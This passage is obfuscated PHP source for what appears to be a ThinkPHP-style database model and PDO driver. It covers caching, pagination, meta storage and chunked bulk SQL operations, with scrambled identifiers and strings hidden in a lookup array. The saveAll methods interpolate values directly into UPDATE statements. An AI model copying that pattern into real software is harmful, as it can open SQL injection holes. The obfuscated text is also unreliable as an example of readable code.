$Ù—µ®Õ¤; } public function cacheFunctionClear($ºàĞéÛ¶, $ş’ÅÀÍ, $¶Ë÷‡Œ¸ = '') { $„úÏ¬°Ó = $ş’ÅÀÍ; if (!is_array($ş’ÅÀÍ)) { $„úÏ¬°Ó = array($ş’ÅÀÍ); } foreach ($„úÏ¬°Ó as $Ï£©­ë‡) { $¯î¨Ú®Õ = $this->cacheKeyMake($ºàĞéÛ¶, $Ï£©­ë‡, $¶Ë÷‡Œ¸); Cache::remove($¯î¨Ú®Õ); } } public function cacheKeyMake($ôí† ûâ, $ Ğ‚Î¨Ñ, $™Å¹íŒ) { $ÚÖõßû =& $_SERVER[ˆö¿ÚÌ¼]; if ($™Å¹íŒ) { $ Ğ‚Î¨Ñ = $ Ğ‚Î¨Ñ . $ÚÖõßû[439] . $™Å¹íŒ; } return get_class($this) . $ÚÖõßû[11] . $ôí† ûâ . $ÚÖõßû[440] . $ Ğ‚Î¨Ñ; } protected function selectPageReset() { $ê•´’“ú =& $_SERVER[ˆö¿ÚÌ¼]; if (isset($GLOBALS[$ê•´’“ú[441]])) { return; } $GLOBALS[$ê•´’“ú[441]] = isset($GLOBALS[$ê•´’“ú[7]][$ê•´’“ú[442]]) ? $GLOBALS[$ê•´’“ú[7]][$ê•´’“ú[442]] : !1; $GLOBALS[$ê•´’“ú[443]] = isset($GLOBALS[$ê•´’“ú[7]][$ê•´’“ú[431]]) ? $GLOBALS[$ê•´’“ú[7]][$ê•´’“ú[431]] : !1; $GLOBALS[$ê•´’“ú[7]][$ê•´’“ú[442]] = !1; $GLOBALS[$ê•´’“ú[7]][$ê•´’“ú[431]] = !1; } protected function selectPageRestore() { $ş®æËÅ =& $_SERVER[ˆö¿ÚÌ¼]; if (!isset($GLOBALS[$ş®æËÅ[441]])) { return; } $GLOBALS[$ş®æËÅ[7]][$ş®æËÅ[442]] = $GLOBALS[$ş®æËÅ[441]]; $GLOBALS[$ş®æËÅ[7]][$ş®æËÅ[431]] = $GLOBALS[$ş®æËÅ[443]]; if ($GLOBALS[$ş®æËÅ[7]][$ş®æËÅ[442]] === !1) { unset($GLOBALS[$ş®æËÅ[7]][$ş®æËÅ[442]]); } if ($GLOBALS[$ş®æËÅ[7]][$ş®æËÅ[431]] === !1) { unset($GLOBALS[$ş®æËÅ[7]][$ş®æËÅ[431]]); } unset($GLOBALS[$ş®æËÅ[441]]); unset($GLOBALS[$ş®æËÅ[443]]); } protected function selectPage($‡¯–ƒ÷Ñ = 200, $ŸğÀÚæº = 1) { $¾Í‰ªßñ =& $_SERVER[ˆö¿ÚÌ¼]; global $in; $œ¿›”³£ = $this->optionsValue(); $û ‡Ãå = 50000; $‡¯–ƒ÷Ñ = isset($in[$¾Í‰ªßñ[442]]) && $in[$¾Í‰ªßñ[442]] ? $in[$¾Í‰ªßñ[442]] : $‡¯–ƒ÷Ñ; if ($‡¯–ƒ÷Ñ === -1) { $in[$¾Í‰ªßñ[442]] = !1; $û ‡Ãå = 100000000; $‡¯–ƒ÷Ñ = $û ‡Ãå; } $·Ó€’ì¢ = $œ¿›”³£; $·Ó€’ì¢[$¾Í‰ªßñ[444]] = array(); $‡¯–ƒ÷Ñ = intval($‡¯–ƒ÷Ñ); $‡¯–ƒ÷Ñ = $‡¯–ƒ÷Ñ <= 5 ? 5 : ($‡¯–ƒ÷Ñ >= $û ‡Ãå ? $û ‡Ãå : $‡¯–ƒ÷Ñ); $ŸğÀÚæº = intval(isset($in[$¾Í‰ªßñ[431]]) && $in[$¾Í‰ªßñ[431]] ? $in[$¾Í‰ªßñ[431]] : $ŸğÀÚæº); $ŸğÀÚæº = $ŸğÀÚæº <= 1 ? 1 : $ŸğÀÚæº; $šû“óÔÜ = array(); $±§İ—Ÿñ = 1; if ($ŸğÀÚæº == 1 && $±§İ—Ÿñ) { $this->optionsValue($œ¿›”³£); $šû“óÔÜ = $this->page($ŸğÀÚæº, $‡¯–ƒ÷Ñ)->select(); $ı‰ş¥®ª = is_array($šû“óÔÜ) ? count($šû“óÔÜ) : 0; if ($ı‰ş¥®ª < $‡¯–ƒ÷Ñ) { $”‹ˆ…Ê® = 1; } else { $this->optionsValue($·Ó€’ì¢); $ı‰ş¥®ª = intval($this->count()); $”‹ˆ…Ê® = ceil($ı‰ş¥®ª / $‡¯–ƒ÷Ñ); } } else { $this->optionsValue($·Ó€’ì¢); $ı‰ş¥®ª = intval($this->count()); $”‹ˆ…Ê® = ceil($ı‰ş¥®ª / $‡¯–ƒ÷Ñ); $ŸğÀÚæº = $ŸğÀÚæº >= $”‹ˆ…Ê® ? $”‹ˆ…Ê® : $ŸğÀÚæº; $this->optionsValue($œ¿›”³£); $šû“óÔÜ = $this->page($ŸğÀÚæº, $‡¯–ƒ÷Ñ)->select(); } if (!is_array($šû“óÔÜ)) { $šû“óÔÜ = array(); } if ($”‹ˆ…Ê® == 1) { $ı‰ş¥®ª = count($šû“óÔÜ); } $åïè„ = array($¾Í‰ªßñ[445] => array($¾Í‰ªßñ[446] => $ı‰ş¥®ª, $¾Í‰ªßñ[442] => $‡¯–ƒ÷Ñ, $¾Í‰ªßñ[431] => $ŸğÀÚæº, $¾Í‰ªßñ[447] => $”‹ˆ…Ê®), $¾Í‰ªßñ[448] => $šû“óÔÜ); return $åïè„; } protected function checkLength($©¨ïÙ—ê, $–¾™¶³É = 0, $¯äÄöãÏ = '') { $¶Ê°é®Œ =& $_SERVER[ˆö¿ÚÌ¼]; $–¾™¶³É = $–¾™¶³É ? $–¾™¶³É : 65536; if (!$©¨ïÙ—ê || strlen($©¨ïÙ—ê) < $–¾™¶³É) { return; } $¯äÄöãÏ = $¯äÄöãÏ ? $¯äÄöãÏ . $¶Ê°é®Œ[74] : $¶Ê°é®Œ[12]; show_json($¯äÄöãÏ . LNG($¶Ê°é®Œ[449]) . "\50{$–¾™¶³É}\x29", !1); } protected function metaSet($ åš§À, $¦ã¨âõ = null, $Ô’ÁÉÏ˜ = null) { $£»º˜— =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->tableMeta || !$ åš§À) { return !1; } $üŒ‡‘æÀ = $this->tableMeta[$£»º˜—[450]]; $™Åï³×Ä = $this->tableMeta[$£»º˜—[451]]; $Ş–”Ë = Model($™Åï³×Ä); $Ø¾ìƒëø = array($üŒ‡‘æÀ => $ åš§À, $£»º˜—[452] => $¦ã¨âõ); if (is_null($¦ã¨âõ)) { return $Ş–”Ë->where(array($üŒ‡‘æÀ => $ åš§À))->delete(); } if (is_null($Ô’ÁÉÏ˜) && is_string($¦ã¨âõ)) { return $Ş–”Ë->where($Ø¾ìƒëø)->delete(); } $û•‰ß†ı = is_array($¦ã¨âõ) ? $¦ã¨âõ : array(); if (is_string($¦ã¨âõ)) { $û•‰ß†ı[$¦ã¨âõ] = $Ô’ÁÉÏ˜; } $˜œšóÖÀ = array(); foreach ($û•‰ß†ı as $ªˆ£“Ã => $ËŒˆ“Ä¬) { if (is_null($ËŒˆ“Ä¬) && is_string($ªˆ£“Ã)) { $Ş–”Ë->where(array($üŒ‡‘æÀ => $ åš§À, $£»º˜—[452] => $ªˆ£“Ã))->delete(); continue; } $this->checkLength($ËŒˆ“Ä¬, !1, $™Åï³×Ä . $£»º˜—[4] . $ªˆ£“Ã); $˜œšóÖÀ[] = array($üŒ‡‘æÀ => $ åš§À, $£»º˜—[97] => $ªˆ£“Ã, $£»º˜—[453] => $ËŒˆ“Ä¬); } $Ñ£õÜä = $£»º˜—[454] . $™Åï³×Ä; CacheLock::lock($Ñ£õÜä); $Ş–”Ë->where(array($üŒ‡‘æÀ => $ åš§À))->addAll($˜œšóÖÀ, array(), !0); CacheLock::unlock($Ñ£õÜä); return !0; } public function metaGet($µ¸¾†öí, $ºí±¸ı˜ = false) { $ÄöºÂÇÙ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->tableMeta) { return array(); } $±½à³„ = $this->tableMeta[$ÄöºÂÇÙ[450]]; $ÆÑºù®… = Model($this->tableMeta[$ÄöºÂÇÙ[451]]); if ($ºí±¸ı˜) { $Îé–Æº¶ = array($±½à³„ => $µ¸¾†öí, $ÄöºÂÇÙ[97] => $ºí±¸ı˜); return $ÆÑºù®…->where($Îé–Æº¶)->getField($ÄöºÂÇÙ[453]); } $Îé–Æº¶ = array($±½à³„ => $µ¸¾†öí); $Š¸Ûë›€ = $ÆÑºù®…->field($ÄöºÂÇÙ[455])->where($Îé–Æº¶)->select(); $Š¸Ûë›€ = array_to_keyvalue($Š¸Ûë›€, $ÄöºÂÇÙ[97], $ÄöºÂÇÙ[453]); return $Š¸Ûë›€; } private function checkDataAutoHas($­´¼éªà) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¾²¨İ…¥) { if (in_array($­´¼éªà, explode($_SERVER[ˆö¿ÚÌ¼][50], $¾²¨İ…¥[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ùóİÕŞ¡, $çÀ€ÇĞª) { $Ë¹Ù„Ğ‚ =& $_SERVER[ˆö¿ÚÌ¼]; if (!is_array($ùóİÕŞ¡)) { return; } foreach ($this->dataAuto as $ú–Í•Ó) { $÷»¥ÆºÊ = $ú–Í•Ó[0]; if (!in_array($çÀ€ÇĞª, explode($Ë¹Ù„Ğ‚[50], $ú–Í•Ó[2]))) { continue; } switch (trim($ú–Í•Ó[3])) { case $Ë¹Ù„Ğ‚[399]: case $Ë¹Ù„Ğ‚[400]: $éßåü•€ = $ú–Í•Ó[1]; $İ¼¥óáö = isset($ú–Í•Ó[4]) ? (array) $ú–Í•Ó[4] : array(); if ($éßåü•€ == $Ë¹Ù„Ğ‚[207] && array_key_exists($÷»¥ÆºÊ, $ùóİÕŞ¡)) { if (!$ùóİÕŞ¡[$÷»¥ÆºÊ]) { unset($ùóİÕŞ¡[$÷»¥ÆºÊ]); } break; } if (isset($ùóİÕŞ¡[$÷»¥ÆºÊ])) { array_unshift($İ¼¥óáö, $ùóİÕŞ¡[$÷»¥ÆºÊ]); } if ($Ë¹Ù„Ğ‚[399] == $ú–Í•Ó[3]) { $ùóİÕŞ¡[$÷»¥ÆºÊ] = call_user_func_array($éßåü•€, $İ¼¥óáö); } else { $ùóİÕŞ¡[$÷»¥ÆºÊ] = call_user_func_array(array(&$this, $éßåü•€), $İ¼¥óáö); } break; case $Ë¹Ù„Ğ‚[350]: if (isset($ùóİÕŞ¡[$÷»¥ÆºÊ]) && $ùóİÕŞ¡[$÷»¥ÆºÊ]) { $ùóİÕŞ¡[$÷»¥ÆºÊ] = call_user_func_array(array(&$this, $ú–Í•Ó[1]), array($ùóİÕŞ¡[$÷»¥ÆºÊ])); } break; case $Ë¹Ù„Ğ‚[353]: $ùóİÕŞ¡[$÷»¥ÆºÊ] = $ùóİÕŞ¡[$ú–Í•Ó[1]]; break; case $Ë¹Ù„Ğ‚[372]: if (isset($ùóİÕŞ¡[$÷»¥ÆºÊ]) && !is_string($ùóİÕŞ¡[$÷»¥ÆºÊ])) { $ùóİÕŞ¡[$÷»¥ÆºÊ] = json_encode_force($ùóİÕŞ¡[$÷»¥ÆºÊ]); } break; case $Ë¹Ù„Ğ‚[401]: if ($ùóİÕŞ¡[$÷»¥ÆºÊ] === $Ë¹Ù„Ğ‚[12]) { unset($ùóİÕŞ¡[$÷»¥ÆºÊ]); } break; case $Ë¹Ù„Ğ‚[402]: $ùóİÕŞ¡[$÷»¥ÆºÊ] = $ú–Í•Ó[1]; default: break; } } if ($çÀ€ÇĞª == $Ë¹Ù„Ğ‚[433]) { $”ª¡ÎÈÏ = strtolower($this->db->getDbType()); if (strpos($”ª¡ÎÈÏ, $Ë¹Ù„Ğ‚[13]) !== 0) { return; } $ëÁÓÜˆƒ = $this->field(!0)->fields; $§«ò—§ü = $ëÁÓÜˆƒ[$Ë¹Ù„Ğ‚[332]]; if (isset($ëÁÓÜˆƒ[$Ë¹Ù„Ğ‚[331]])) { unset($§«ò—§ü[$ëÁÓÜˆƒ[$Ë¹Ù„Ğ‚[331]]]); } foreach ($§«ò—§ü as $ÅÏ˜Ê¿² => $çÀ€ÇĞª) { if (!isset($ùóİÕŞ¡[$ÅÏ˜Ê¿²])) { $ùóİÕŞ¡[$ÅÏ˜Ê¿²] = $Ë¹Ù„Ğ‚[12]; } } } } private function dataAfterFilter(&$ë¼™í”£) { $¸÷”óÒÜ =& $_SERVER[ˆö¿ÚÌ¼]; foreach ($this->dataAuto as $€£•µúŸ) { $£¾¯šÍª = $€£•µúŸ[0]; if (!isset($ë¼™í”£[$£¾¯šÍª])) { continue; } if (!in_array($¸÷”óÒÜ[435], explode($¸÷”óÒÜ[50], $€£•µúŸ[2]))) { continue; } switch (trim($€£•µúŸ[3])) { case $¸÷”óÒÜ[399]: case $¸÷”óÒÜ[400]: $ˆ¥·ÍŒ¿ = isset($€£•µúŸ[4]) ? (array) $€£•µúŸ[4] : array(); array_unshift($ˆ¥·ÍŒ¿, $ë¼™í”£[$£¾¯šÍª]); if (isset($€£•µúŸ[4]) && $€£•µúŸ[4] == $¸÷”óÒÜ[456]) { $ˆ¥·ÍŒ¿ = array($ë¼™í”£[$£¾¯šÍª]); } if ($¸÷”óÒÜ[399] == $€£•µúŸ[3]) { $ë¼™í”£[$£¾¯šÍª] = call_user_func_array($€£•µúŸ[1], $ˆ¥·ÍŒ¿); } else { $ë¼™í”£[$£¾¯šÍª] = call_user_func_array(array(&$this, $€£•µúŸ[1]), $ˆ¥·ÍŒ¿); } break; case $¸÷”óÒÜ[350]: if (isset($ë¼™í”£[$£¾¯šÍª]) && $ë¼™í”£[$£¾¯šÍª]) { $ë¼™í”£[$£¾¯šÍª] = call_user_func_array(array(&$this, $€£•µúŸ[1]), array($ë¼™í”£[$£¾¯šÍª])); } break; case $¸÷”óÒÜ[353]: $ë¼™í”£[$£¾¯šÍª] = $ë¼™í”£[$€£•µúŸ[1]]; break; case $¸÷”óÒÜ[372]: $ıò¯ôûú = $ë¼™í”£[$£¾¯šÍª]; $ë¼™í”£[$£¾¯šÍª] = json_decode($ıò¯ôûú, !0); if (is_null($ë¼™í”£[$£¾¯šÍª])) { $ë¼™í”£[$£¾¯šÍª] = $ıò¯ôûú; } break; case $¸÷”óÒÜ[401]: if ($ë¼™í”£[$£¾¯šÍª] === $¸÷”óÒÜ[12]) { unset($ë¼™í”£[$£¾¯šÍª]); } break; case $¸÷”óÒÜ[402]: $ë¼™í”£[$£¾¯šÍª] = $€£•µúŸ[1]; break; default: break; } } } public function saveAll($›¨ÃÊ‡) { $¢¼­Ÿ„  =& $_SERVER[ˆö¿ÚÌ¼]; $Ê¢‰ŸÎÄ = $this->tablePrefix . $this->tableName; $—œÅÉÄü = self::SQL_WHERE_IN_CHUNK; $›¨ÃÊ‡ = is_array($›¨ÃÊ‡) ? $›¨ÃÊ‡ : array(); $Ú¿ØÉİ’ = $¢¼­Ÿ„ [457]; $ãá‚şØ´ = 0; $ ãöò = array(); $ØÊİüñ = count($›¨ÃÊ‡); for ($Ù™º¦üº = 0; $Ù™º¦üº < $ØÊİüñ; $Ù™º¦üº++) { $æÑûæ“° = $›¨ÃÊ‡[$Ù™º¦üº]; if (!is_array($æÑûæ“°) || count($æÑûæ“°) != 4) { continue; } $œõ­œŸ‹ = "\125\120\104\x41\x54\105\x20\140{$Ê¢‰ŸÎÄ}\x60\x20\123\105\124\40{$æÑûæ“°[2]}\40\x3d\40\103\101\123\x45\x20{$æÑûæ“°[0]}\40\12"; if ($ãá‚şØ´ == 0) { $Ú¿ØÉİ’ = $œõ­œŸ‹; } $ ãöò[] = $¢¼­Ÿ„ [121] . $æÑûæ“°[1] . $¢¼­Ÿ„ [121]; $ãá‚şØ´++; $Ú¿ØÉİ’ .= "\40\x57\110\x45\x4e\40\x27{$æÑûæ“°[1]}\47\40\124\110\105\x4e\x20\x27{$æÑûæ“°[3]}\47\x20\xa"; if ($ãá‚şØ´ == $—œÅÉÄü || $Ù™º¦üº == $ØÊİüñ - 1) { $¹šÆ£áî = implode($¢¼­Ÿ„ [50], $ ãöò); $Ú¿ØÉİ’ .= "\40\x45\x4e\x44\x20\x20\127\110\x45\x52\105\40{$æÑûæ“°[0]}\x20\111\x4e\x20\50{$¹šÆ£áî}\x29\x20"; $this->execute($Ú¿ØÉİ’); $ãá‚şØ´ = 0; $Ú¿ØÉİ’ = $œõ­œŸ‹; $this->chunkEventCheck(count($ ãöò)); $ ãöò = array(); } } $this->chunkEventSet(); } public function saveAllEach($¯¯İç×û) { $Ë¶ç°Å§ =& $_SERVER[ˆö¿ÚÌ¼]; $¶”¯•ùÍ = $this->tablePrefix . $this->tableName; foreach ($¯¯İç×û as $°¦ğ¦ô’) { if (!is_array($°¦ğ¦ô’) || count($°¦ğ¦ô’) != 4) { continue; } $ù˜³ğÓ® = $°¦ğ¦ô’[0] . $Ë¶ç°Å§[458] . $°¦ğ¦ô’[1] . $Ë¶ç°Å§[121]; $Ç‰ü›ï€ = $°¦ğ¦ô’[2] . $Ë¶ç°Å§[458] . $°¦ğ¦ô’[3] . $Ë¶ç°Å§[121]; $ÛÆÕ‰á = "\165\x70\x64\141\164\x65\40{$¶”¯•ùÍ}\x20\163\x65\x74\x20{$Ç‰ü›ï€}\40\x77\x68\145\x72\145\x20{$ù˜³ğÓ®}\73"; $this->execute($ÛÆÕ‰á); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($âà¯Ñ©à = false, $·ú¦ È× = false) { $this->_chunkEvent = $âà¯Ñ©à; $this->_chunkEventParam = $·ú¦ È×; } private function chunkEventCheck($ã‘Ú¹ÈÖ) { if (!$this->_chunkEvent) { return; } $Î¦íìÁ² = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Î¦íìÁ²[$_SERVER[ˆö¿ÚÌ¼][459]] = $ã‘Ú¹ÈÖ; Hook::trigger($this->_chunkEvent, $Î¦íìÁ²); } public function addAll($¡‚ÌÌ², $‘«ìŠà = array(), $óêî‚—ô = false) { $ô–šÓš· =& $_SERVER[ˆö¿ÚÌ¼]; ignore_timeout(); $ì ¦­Š = self::SQL_WHERE_IN_CHUNK; if (empty($¡‚ÌÌ²)) { $this->error = think_lang($ô–šÓš·[351]); return !1; } $‘«ìŠà = $this->_parseOptions($‘«ìŠà); foreach ($¡‚ÌÌ² as $¥¡ŞŸ¾º => $ĞĞø“Œø) { $¡‚ÌÌ²[$¥¡ŞŸ¾º] = $this->_facade($ĞĞø“Œø); $this->_beforeInsert($¡‚ÌÌ²[$¥¡ŞŸ¾º], $‘«ìŠà); } if (method_exists($this->db, $ô–šÓš·[352])) { for ($ŒÓ€™›¾ = 0; $ŒÓ€™›¾ < count($¡‚ÌÌ²); $ŒÓ€™›¾ += $ì ¦­Š) { $İŞ‘Ş›° = array_slice($¡‚ÌÌ², $ŒÓ€™›¾, $ì ¦­Š); if (!is_array($İŞ‘Ş›°) || count($İŞ‘Ş›°) == 0) { break; } $‹¨û–«í = $this->db->insertAll($İŞ‘Ş›°, $‘«ìŠà, $óêî‚—ô); $this->chunkEventCheck(count($İŞ‘Ş›°)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¡‚ÌÌ² as $¥¡ŞŸ¾º => $ĞĞø“Œø) { $‹¨û–«í = $this->db->insert($ĞĞø“Œø, $‘«ìŠà, $óêî‚—ô); } $this->commit(); } if (!1 !== $‹¨û–«í) { $»¬Üæ Š = $this->getLastInsID(); if ($»¬Üæ Š) { return $»¬Üæ Š; } } return $‹¨û–«í; } public function save($«…‚ì©ş = '', $™¾ÑñòÀ = array()) { $š–ô¤Òı =& $_SERVER[ˆö¿ÚÌ¼]; $Ì¿ìüíœ = self::SQL_WHERE_IN_CHUNK; $„Œ®²èä = $this->optionsValue(); $¾ŠğÏ½ = $this->findWhereField($„Œ®²èä); if (!$¾ŠğÏ½) { return parent::save($«…‚ì©ş, $™¾ÑñòÀ); } $ß£ £¦… = 0; $€¼‚ƒ³‘ = $„Œ®²èä[$š–ô¤Òı[355]][$¾ŠğÏ½][1]; $€¼‚ƒ³‘ = is_array($€¼‚ƒ³‘) ? $€¼‚ƒ³‘ : array(); $Á¦é­Æ = count($€¼‚ƒ³‘); for ($¢Üƒ³£Ì = 0; $¢Üƒ³£Ì < $Á¦é­Æ; $¢Üƒ³£Ì += $Ì¿ìüíœ) { $ÜÃèÓ‰™ = array_slice($€¼‚ƒ³‘, $¢Üƒ³£Ì, $Ì¿ìüíœ); if (!is_array($ÜÃèÓ‰™) || count($ÜÃèÓ‰™) == 0) { break; } $„Œ®²èä[$š–ô¤Òı[355]][$¾ŠğÏ½][1] = $ÜÃèÓ‰™; $this->optionsValue($„Œ®²èä); $ß£ £¦… += parent::save($«…‚ì©ş, $™¾ÑñòÀ); $this->chunkEventCheck(count($ÜÃèÓ‰™)); } $this->chunkEventSet(); return $ß£ £¦…; } public function add($Š²§—¼ã = '', $ÄêÚİ­ = array(), $Ä·™¸Í = false) { if ($this->addTaskStatus && is_array($Š²§—¼ã)) { $this->addTaskData[] = $Š²§—¼ã; return; } return parent::add($Š²§—¼ã, $ÄêÚİ­, $Ä·™¸Í); } public function parseWhereLike($ëÂŸ¡¯ğ, $•õÀ¼ ë = '', $©’¦îó¦ = false, &$•ÂÎ×¤˜ = false) { $­ª¿·û =& $_SERVER[ˆö¿ÚÌ¼]; $ÏëôÚÖ» = $GLOBALS[$­ª¿·û[6]][$­ª¿·û[460]]; if (!$ÏëôÚÖ»[$­ª¿·û[461]]) { return $ëÂŸ¡¯ğ; } if (!is_array($ëÂŸ¡¯ğ)) { return $ëÂŸ¡¯ğ; } $¼ü„çò© = array(); $ÎƒÇùÀ‚ = 0; foreach ($ëÂŸ¡¯ğ as $Ú¼ÂÉµî => $§ºúßÛ) { if (is_array($§ºúßÛ) && count($§ºúßÛ) == 2 && $§ºúßÛ[0] == $­ª¿·û[462] && is_string($§ºúßÛ[1]) && substr($§ºúßÛ[1], 0, 1) == $­ª¿·û[463] && substr($§ºúßÛ[1], strlen($§ºúßÛ[1]) - 1, 1) == $­ª¿·û[463]) { $•ÂÎ×¤˜ = !0; $æ¿™å´Ç = is_string($Ú¼ÂÉµî) ? $Ú¼ÂÉµî : $•õÀ¼ ë; $°…¼ê¢’ = substr($§ºúßÛ[1], 1, strlen($§ºúßÛ[1]) - 2); $°…¼ê¢’ = $this->db->escapeString($°…¼ê¢’); if (!strpos($æ¿™å´Ç, $­ª¿·û[10])) { $æ¿™å´Ç = $­ª¿·û[464] . $æ¿™å´Ç . $­ª¿·û[464]; } $È§áÄ°‘ = $­ª¿·û[223] . $°…¼ê¢’ . $­ª¿·û[223]; $°…¼ê¢’ = str_replace(array($­ª¿·û[10], $­ª¿·û[465], $­ª¿·û[11]), $­ª¿·û[466], $°…¼ê¢’); if ($ÏëôÚÖ»[$­ª¿·û[467]]) { $È§áÄ°‘ = $­ª¿·û[468] . $°…¼ê¢’ . $­ª¿·û[469]; if ($ÏëôÚÖ»[$­ª¿·û[470]]) { $È§áÄ°‘ = $­ª¿·û[469] . $°…¼ê¢’ . $­ª¿·û[468]; } } $¼ü„çò©[$ÎƒÇùÀ‚] = $­ª¿·û[471] . $æ¿™å´Ç . $­ª¿·û[472] . $È§áÄ°‘ . $­ª¿·û[473]; $ÎƒÇùÀ‚++; continue; } if (is_array($§ºúßÛ)) { $•õÀ¼ ë = is_string($Ú¼ÂÉµî) ? $Ú¼ÂÉµî : $•õÀ¼ ë; $§ºúßÛ = $this->parseWhereLike($§ºúßÛ, $•õÀ¼ ë, !0, $•ÂÎ×¤˜); } if (is_numeric($Ú¼ÂÉµî)) { $¼ü„çò©[$ÎƒÇùÀ‚] = $§ºúßÛ; $ÎƒÇùÀ‚++; } else { $¼ü„çò©[$Ú¼ÂÉµî] = $§ºúßÛ; } } if ($•ÂÎ×¤˜ && !$©’¦îó¦) { } return $¼ü„çò©; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($¨ÊÓóùÇ = array()) { $ã£°¿¬Ÿ =& $_SERVER[ˆö¿ÚÌ¼]; $å‚ºåöˆ = self::SQL_WHERE_IN_CHUNK; $èÇ£…‹­ = $this->optionsValue(); $ƒ¾öƒÁÉ = $this->findWhereField($èÇ£…‹­); if (!$ƒ¾öƒÁÉ || isset($èÇ£…‹­[$ã£°¿¬Ÿ[370]]) || isset($èÇ£…‹­[$ã£°¿¬Ÿ[431]])) { return parent::select($¨ÊÓóùÇ); } $îóÑÄé‹ = $èÇ£…‹­[$ã£°¿¬Ÿ[355]][$ƒ¾öƒÁÉ][1]; $îóÑÄé‹ = is_array($îóÑÄé‹) ? $îóÑÄé‹ : array(); $ ¤éœªü = null; for ($¯ÛóÌ™² = 0; $¯ÛóÌ™² < count($îóÑÄé‹); $¯ÛóÌ™² += $å‚ºåöˆ) { $Ôõ»…Ä„ = array_slice($îóÑÄé‹, $¯ÛóÌ™², $å‚ºåöˆ); if (!is_array($Ôõ»…Ä„) || count($Ôõ»…Ä„) == 0) { break; } $èÇ£…‹­[$ã£°¿¬Ÿ[355]][$ƒ¾öƒÁÉ][1] = $Ôõ»…Ä„; $this->optionsValue($èÇ£…‹­); $™»¡½ªã = parent::select($¨ÊÓóùÇ); if (!$™»¡½ªã) { continue; } $ ¤éœªü = is_array($ ¤éœªü) ? $ ¤éœªü : array(); $ ¤éœªü = array_merge($ ¤éœªü, $™»¡½ªã); } return $ ¤éœªü; } public function delete($Ñ··âŞº = array()) { $˜óØŒ¨í =& $_SERVER[ˆö¿ÚÌ¼]; $¶İô—¾ = self::SQL_WHERE_IN_CHUNK; $Œ¿ˆï‡ò = $this->optionsValue(); $ÀéĞ÷öù = $this->findWhereField($Œ¿ˆï‡ò); if (!$ÀéĞ÷öù) { return parent::delete($Ñ··âŞº); } $‡ÎœÆ×Ò = 0; $ÕøïğĞË = $Œ¿ˆï‡ò[$˜óØŒ¨í[355]][$ÀéĞ÷öù][1]; $ÕøïğĞË = is_array($ÕøïğĞË) ? $ÕøïğĞË : array(); for ($›Ñ²ßö = 0; $›Ñ²ßö < count($ÕøïğĞË); $›Ñ²ßö += $¶İô—¾) { $ˆÛğ±ÙÆ = array_slice($ÕøïğĞË, $›Ñ²ßö, $¶İô—¾); if (!is_array($ˆÛğ±ÙÆ) || count($ˆÛğ±ÙÆ) == 0) { break; } $Œ¿ˆï‡ò[$˜óØŒ¨í[355]][$ÀéĞ÷öù][1] = $ˆÛğ±ÙÆ; $this->optionsValue($Œ¿ˆï‡ò); $‡ÎœÆ×Ò += parent::delete($Ñ··âŞº); } return $‡ÎœÆ×Ò; } private function findWhereField($ãş”Çä×) { $Ÿ—Èò =& $_SERVER[ˆö¿ÚÌ¼]; $‘Ù”Ô‡® = self::SQL_WHERE_IN_CHUNK; if (!is_array($ãş”Çä×) || !is_array($ãş”Çä×[$Ÿ—Èò[355]])) { return !1; } foreach ($ãş”Çä×[$Ÿ—Èò[355]] as $ÎàÁ¶àâ => $øû’·Ş) { if (is_array($øû’·Ş) && isset($øû’·Ş[0]) && is_string($øû’·Ş[0]) && strtolower($øû’·Ş[0]) == $Ÿ—Èò[7] && is_array($øû’·Ş[1]) && count($øû’·Ş[1]) > $‘Ù”Ô‡®) { ignore_timeout(); return $ÎàÁ¶àâ; } } return !1; } public function setMasterDB($ù„åñÁ² = true) { think_config($_SERVER[ˆö¿ÚÌ¼][474], $ù„åñÁ²); } } goto F³Äí…ö¾Ñ; a‘»É™™³: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ŒÔÃ×ô¢ = '') { $¤Êáç´Ë =& $_SERVER[ˆö¿ÚÌ¼]; if (!class_exists($¤Êáç´Ë[1005])) { think_exception(think_lang($¤Êáç´Ë[14]) . $¤Êáç´Ë[1006]); } if (!empty($ŒÔÃ×ô¢)) { $this->config = $ŒÔÃ×ô¢; if (empty($this->config[$¤Êáç´Ë[17]])) { $this->config[$¤Êáç´Ë[17]] = array(); } } } public function connect($¨éÙ‚õ× = '', $öÃ¨”ƒÌ = 0) { $ù„ªÏùâ =& $_SERVER[ˆö¿ÚÌ¼]; if (!isset($this->linkID[$öÃ¨”ƒÌ])) { if (empty($¨éÙ‚õ×)) { $¨éÙ‚õ× = $this->config; } $á½Ê©åÊ = !empty($¨éÙ‚õ×[$ù„ªÏùâ[17]][$ù„ªÏùâ[18]]) ? $¨éÙ‚õ×[$ù„ªÏùâ[17]][$ù„ªÏùâ[18]] : $this->pconnect; if ($á½Ê©åÊ) { $¨éÙ‚õ×[$ù„ªÏùâ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$öÃ¨”ƒÌ] = new PDO($¨éÙ‚õ×[$ù„ªÏùâ[1007]], $¨éÙ‚õ×[$ù„ªÏùâ[979]], $¨éÙ‚õ×[$ù„ªÏùâ[980]], $¨éÙ‚õ×[$ù„ªÏùâ[17]]); } catch (PDOException $À¼ê¹û) { think_exception($À¼ê¹û->getMessage()); } $this->dbType = $this->_getDsnType($¨éÙ‚õ×[$ù„ªÏùâ[1007]]); if (in_array($this->dbType, array($ù„ªÏùâ[1008], $ù„ªÏùâ[1009], $ù„ªÏùâ[1010], $ù„ªÏùâ[1011]))) { think_exception($ù„ªÏùâ[1012] . $this->dbType . $ù„ªÏùâ[1013] . $this->dbType . $ù„ªÏùâ[1014]); } if (!$this->linkID[$öÃ¨”ƒÌ]) { think_exception($ù„ªÏùâ[1015]); } try { $this->linkID[$öÃ¨”ƒÌ]->exec($ù„ªÏùâ[1016] . think_config($ù„ªÏùâ[982])); } catch (Exception 